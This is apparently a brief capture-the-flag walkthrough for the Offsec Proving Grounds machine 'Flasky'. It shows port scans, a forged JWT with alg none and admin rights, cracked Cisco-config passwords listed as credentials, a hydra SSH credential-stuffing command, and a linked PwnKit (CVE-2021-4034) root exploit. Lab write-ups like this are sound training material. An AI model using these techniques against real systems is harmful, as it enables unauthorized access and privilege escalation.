# Flasky

## Info

Flasky is an intermediate linux machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
5555/tcp  open  http    syn-ack ttl 61 nginx 1.18.0 (Ubuntu)
20202/tcp open  http    syn-ack ttl 61 nginx 1.18.0 (Ubuntu)
```

## HTTP 20202

Change the jwt token to the following.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6ICIwIiwiZ3Vlc3QiOiAiZmFsc2UiLCJhZG1pbiI6IHRydWV9.
```

This changes alg none, id to 0, guest false and admin true. This can be done with base64. Then login with admin:admin and use the above jwt.

There is a link in johns message to `cisco_config`.

Using the following website to crack the passwords.

```
https://www.ifm.net.nz/cookbooks/passwordcracker.html
```

Credentials.

```
angie:@ngie@1337
jane:S3cR3TL33t
jill:jill@lijj
john:NezukoCh@n
admin:PY1h0nFl@sK
kunal:P@tel
```

Using hydra.

```
hydra -C creds.txt <ip> ssh
```

john creds allow login.


## Root

The following exploit gets root.

```
https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
```
